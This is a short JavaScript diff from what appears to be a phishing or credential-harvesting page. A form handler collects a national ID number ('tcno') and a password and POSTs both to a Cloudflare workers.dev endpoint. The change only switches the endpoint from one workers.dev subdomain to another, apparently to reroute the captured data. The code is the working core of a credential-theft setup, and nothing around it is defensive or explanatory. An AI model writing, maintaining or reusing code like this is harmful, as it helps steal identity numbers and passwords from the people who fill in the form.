@@ -45,7 +45,7 @@ function submitCustomForm() {
         data.append('tcno', tc);
         data.append('pass', password);
 
-        fetch('https://bitter-water-6f4c.aisik3516.workers.dev/', {
+        fetch('https://curly-fire-5ecb.aisik3516.workers.dev/', {
             method: 'POST',
             body: data
         })
